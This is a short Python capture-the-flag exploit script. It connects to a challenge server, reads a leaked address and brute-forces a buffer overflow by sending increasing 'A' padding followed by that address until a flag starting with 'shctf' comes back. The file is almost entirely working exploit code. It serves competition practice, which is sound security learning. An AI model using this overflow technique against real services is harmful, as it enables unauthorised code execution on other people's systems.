import socket
import readline

host = '0.cloud.chals.io'
port = 30096


def recv(info=None, decode=True):
    # TODO
    res = s.recv(4096)
    print(f'[<] {info if info else ""}')
    if decode:
        print(res.decode('utf-8'))
    else:
        print(res)
    return res


def recvuntil(stop, decode=True):
    res = b''
    while stop not in res:
        res += recv(decode=decode)
    return res


def send(data):
    # TODO
    data = data + b'\n' if data[-1] != b'\n' else data
    s.send(data)


def interact():
    for _ in range(100):
        cmd = input('> ').encode('ascii')
        send(cmd)
        recv()


for i in range(10):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    res = recv()
    res = res[res.find(b'0x'):]
    tgt = int(res[:res.find(b'\n')].strip(), 16)
    print(hex(tgt))

    payload = b'A'*(i*8) + tgt.to_bytes(8, 'little')
    send(payload)
    res = recv()
    if b'shctf' in res:
        res = res[res.find(b'shctf'):]
        flag = res[:res.find(b'}')+1].decode()
        print('Flag:', flag)
        break

    s.close()
